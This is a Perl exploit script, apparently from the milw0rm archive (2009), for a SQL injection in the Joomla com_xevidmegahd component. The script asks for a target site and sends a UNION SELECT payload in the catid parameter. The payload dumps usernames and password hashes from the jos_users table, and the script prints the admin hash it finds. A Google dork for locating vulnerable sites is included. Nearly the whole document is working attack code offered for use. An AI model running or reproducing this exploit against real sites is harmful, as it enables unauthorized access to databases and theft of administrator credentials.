#!/usr/bin/perl -w

#Joomla com_xevidmegahd Sql injection#
########################################
#[~] Author : EcHoLL
#[~] www.warezturk.org www.tahribat.com
#[~] Greetz : Black_label TURK Godlike Nitrous
#[!] Module_Name: com_xevidmegahd
#[!] Script_Name: Joomla
#[!] Google_Dork: inurl:"com_xevidmegahd"
########################################

system("color FF0000");
system("Nohacking");
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t| Turkish Securtiy Team |\n\n";
print "\t\t-------------------------------------------------------------\n\n";
print "\t\t|Joomla Module com_xevidmegahd(catid=)Remote SQL Injection Vuln|\n\n";
print "\t\t| Coded by: EcHoLL www.warezturk.org |\n\n";
print "\t\t-------------------------------------------------------------\n\n";
use LWP::UserAgent;
print "\nSite ismi Target page:[http://wwww.site.com/path/]: ";
chomp(my $target=<STDIN>);
$column_name="concat(username,0x3a,password)";
$table_name="jos_users";
$b = LWP::UserAgent->new() or die "Could not initialize browser\n";
$b->agent('Mozilla/4.0 (compatible; MSIE 7.0; Windows NT 5.1)');
$host = $target . "/index.php?option=com_xevidmegahd&Itemid=99999999&func=viewcategory&catid=1'+UNION+SELECT+".$column_name."+from/**/".$table_name."+--+";
$res = $b->request(HTTP::Request->new(GET=>$host));
$answer = $res->content; if ($answer =~/([0-9a-fA-F]{32})/){
print "\n[+] Admin Hash : $1\n\n";
print "# Tebrikler Exploit Calisti! #\n\n";
}
else{print "\n[-] Exploit BulunamadÄ±...\n";
}

# milw0rm.com [2009-01-11]
